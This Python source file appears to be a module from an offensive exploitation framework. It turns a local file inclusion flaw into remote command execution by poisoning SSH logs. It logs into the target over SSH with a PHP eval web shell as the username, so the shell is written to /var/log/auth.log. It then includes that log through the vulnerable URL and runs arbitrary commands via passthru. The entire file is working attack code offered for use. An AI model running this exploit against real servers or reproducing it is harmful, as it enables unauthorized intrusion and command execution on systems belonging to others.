import requests
# for url parsing
from urlparse import urlparse
# for url encoding
import urllib

# for SSH
import paramiko

# technique
from core.techniques.LFIExec import LFIExec
# functions
from core.functions import *

class LFISSHLog (LFIExec):
    files_exec = [
        # ssh auth log
        { 'path' : '/var/log/auth.log', 'type' : 'log' }
    ]

    def __init__ (self, lfi):
        return super (LFISSHLog, self).__init__(lfi)

    # find LFI code execution path
    def check (self):
        return super (LFISSHLog, self)._check (prepare_check_log)

    # do exec
    def exploit (self, cmd):
        return super (LFISSHLog, self)._exploit (prepare_exec_log, cmd)

def prepare_check_log (lfi, payload):
    # parsing url and separating in elements
    parsed = urlparse (lfi.original_url)
    # inject payload in auth.log
    ssh_connect (parsed.netloc, payload, rand_str(20))
    return lfi.pattern_url[:]

def prepare_exec_log (lfi, cmd):
    # parsing url and separating in elements
    parsed = urlparse (lfi.original_url)
    # inject payload in auth.log
    payload_exec = '<?php eval ($_GET["p"]); ?>'
    ssh_connect (parsed.netloc, payload_exec, rand_str(20))
    # prepare purl for exec command
    purl = lfi.pattern_url[:]
    payload = '&p=echo "' + lfi.tag_start_exec + '"; passthru ("{0}"); echo "' + lfi.tag_end_exec + '"; '
    payload = payload.format (cmd)
    purl += payload
    return purl

def ssh_connect (host, user_name, user_pass):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect (host, username=user_name, password=user_pass)
        ssh.close ()
    except Exception:
        pass

